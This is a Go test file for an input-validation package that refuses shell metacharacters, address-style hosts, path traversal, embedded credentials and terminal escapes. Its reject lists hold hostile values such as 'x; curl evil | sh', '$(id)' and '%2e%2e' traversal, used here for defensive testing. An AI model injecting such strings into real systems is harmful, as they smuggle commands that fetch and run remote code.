package plain_test

import (
	"strings"
	"testing"

	"github.com/frontseat-dev/frontseat/server/internal/plain"
)

// A text written plainly is a path's characters, and something.
func TestATextIsWrittenPlainly(t *testing.T) {
	for _, text := range []string{"someone/code.git", "/usr/bin/git", "git-upload-pack", "a_b+c.d"} {
		if !plain.Text(text) {
			t.Errorf("%q was refused", text)
		}
	}
	for _, text := range []string{"", "a b", "a\nb", "a?b", "a=b", "a%2e", "$(id)", "a`b`", "a'b", `a"b`, "a\\b", "a:b"} {
		if plain.Text(text) {
			t.Errorf("%q was taken", text)
		}
	}
}

// A username is one a forge gives, and nothing a shell or a
// configuration would read otherwise.
func TestAUsernameIsOneAForgeGives(t *testing.T) {
	for _, name := range []string{"x-access-token", "someone", "some.one_2@example.org", strings.Repeat("a", 128)} {
		if !plain.Username(name) {
			t.Errorf("%q was refused", name)
		}
	}
	for _, name := range []string{"", "x; curl evil | sh", "a b", "a\nb", "$(id)", "a`b`", "a'b", `a"b`, "a\\b", "a=b", "a/b", strings.Repeat("a", 129)} {
		if plain.Username(name) {
			t.Errorf("%q was taken", name)
		}
	}
}

// A host is a name, in small letters, and never an address however one
// is written.
func TestAHostIsANameAndNeverAnAddress(t *testing.T) {
	for _, host := range []string{"forge.example", "host.docker.internal", "a-b.c2.example", "localhost", "x"} {
		if !plain.Hostname(host) {
			t.Errorf("%q was refused", host)
		}
	}
	for _, host := range []string{"", "192.0.2.7", "127.1", "2130706433", "0x7f.1", "a.0x7f", "Forge.example", "-a.example", "a-.example", "a..example", ".example", "example.", "*.example", "a_b.example", "a b", "[::1]", strings.Repeat("a", 64) + ".example"} {
		if plain.Hostname(host) {
			t.Errorf("%q was taken", host)
		}
	}
}

// An origin is read as a rule names it and a person writes it: a name and
// a port, over https, or over http where it is written so, each spelled
// one way; what is more than a host, or an address, is refused.
func TestAnOriginIsReadAsARuleNamesIt(t *testing.T) {
	for written, want := range map[string][2]string{
		"forge.example":                 {"forge.example:443", "https://forge.example:443"},
		"Forge.Example.":                {"forge.example:443", "https://forge.example:443"},
		"forge.example:8443":            {"forge.example:8443", "https://forge.example:8443"},
		"forge.example:0443":            {"forge.example:443", "https://forge.example:443"},
		"https://forge.example":         {"forge.example:443", "https://forge.example:443"},
		"http://forge.example":          {"http://forge.example:80", "http://forge.example:80"},
		"http://forge.example:8080":     {"http://forge.example:8080", "http://forge.example:8080"},
		"host.docker.internal:59310":    {"host.docker.internal:59310", "https://host.docker.internal:59310"},
		"http://host.docker.internal:1": {"http://host.docker.internal:1", "http://host.docker.internal:1"},
	} {
		at, ok := plain.Ruled(written)
		if !ok || at.Rule() != want[0] || at.URL() != want[1] {
			t.Errorf("Ruled(%q) = %+v, %v; want %s, %s", written, at, ok, want[0], want[1])
		}
	}
	for _, written := range []string{"", "192.0.2.7", "[2001:db8::1]:443", "127.1", "2130706433", "forge.example:0", "forge.example:", "forge.example:+443", "forge.example:65536", "forge.example/path", "http://forge.example/path", "HTTP://forge.example", "someone@forge.example", "ada:token@forge.example", "https://ada:token@forge.example", "ssh://forge.example", "*.example", "forge example"} {
		if at, ok := plain.Ruled(written); ok {
			t.Errorf("Ruled(%q) = %+v, want it refused", written, at)
		}
	}
	// As a URL's parser gives the parts: a scheme of the web's alone.
	if _, ok := plain.OriginOf("ssh", "forge.example", ""); ok {
		t.Error("an origin over ssh was taken")
	}
	if at, ok := plain.OriginOf("https", "forge.example", "8443"); !ok || at.Host() != "forge.example:8443" {
		t.Errorf("OriginOf(https, forge.example, 8443) = %+v, %v", at, ok)
	}
	// As a forge names it: with its port where that is not the scheme's.
	for written, want := range map[string]string{
		"forge.example":             "https://forge.example",
		"forge.example:443":         "https://forge.example",
		"forge.example:80":          "https://forge.example:80",
		"http://forge.example":      "http://forge.example",
		"http://forge.example:8080": "http://forge.example:8080",
	} {
		if at, ok := plain.Ruled(written); !ok || at.Address() != want {
			t.Errorf("Ruled(%q).Address() = %s, %v; want %s", written, at.Address(), ok, want)
		}
	}
}

// A path of a URL is written plainly and climbs nowhere; a program is
// one by its whole path; a parameter holds no path; a secret is one line
// of no great length.
func TestAPathAProgramAParameterAndASecretAreWrittenPlainly(t *testing.T) {
	for _, path := range []string{"/acme/code.git", "/acme/code/info/refs", "/a"} {
		if !plain.Path(path) {
			t.Errorf("the path %q was refused", path)
		}
	}
	for _, path := range []string{"", "/", "acme/code", "/acme/../other", "/acme/%2e%2e/other", "//acme", "/acme//code", "/acme/./code", "/acme/*", "/a b"} {
		if plain.Path(path) {
			t.Errorf("the path %q was taken", path)
		}
	}
	for _, program := range []string{"/usr/bin/git", "/opt/frontseat/bin/frontseatd"} {
		if !plain.Program(program) {
			t.Errorf("the program %q was refused", program)
		}
	}
	for _, program := range []string{"", "/", "git", "/**", "/usr/bin/../bin/git", "/usr/bin/", "/usr/bin/a b"} {
		if plain.Program(program) {
			t.Errorf("the program %q was taken", program)
		}
	}
	if !plain.Parameter("service", "git-upload-pack") {
		t.Error("a plain parameter was refused")
	}
	for _, each := range [][2]string{{"service", "*"}, {"a/b", "c"}, {"a", "b/c"}, {"", "c"}, {"a", ""}} {
		if plain.Parameter(each[0], each[1]) {
			t.Errorf("the parameter %q=%q was taken", each[0], each[1])
		}
	}
	if !plain.Secret("a token") || !plain.Secret(strings.Repeat("s", 4096)) {
		t.Error("a secret of one line was refused")
	}
	for _, secret := range []string{"", "a\nb", "a\rb", "a\x00b", strings.Repeat("s", 4097)} {
		if plain.Secret(secret) {
			t.Errorf("the secret %q was taken", secret)
		}
	}
}

// What is shown of a text keeps what a person reads, lines and tabs
// too, and nothing a terminal acts on.
func TestWhatIsShownOfATextIsNothingATerminalActsOn(t *testing.T) {
	for written, shown := range map[string]string{
		"panicked at src/lib.rs:7:9:\n\tthe lock is gone\n": "panicked at src/lib.rs:7:9:\n\tthe lock is gone\n",
		"na\u00efve \u65e5\u672c":                           "na\u00efve \u65e5\u672c",
		"a\x1b[31mb\rc\x00d\x7fe":                           "a[31mbcde",
		"a\u009b31mb":                                       "a31mb",
		"a\u202eb\u2066c\u200bd\ufeffe":                     "abcde",
		"a\u2028b\u2029c":                                   "abc",
		"a\xffb\xe6\x97":                                    "a\ufffdb\ufffd",
	} {
		if got := plain.Shown(written); got != shown {
			t.Errorf("%q is shown as %q, want %q", written, got, shown)
		}
	}
}
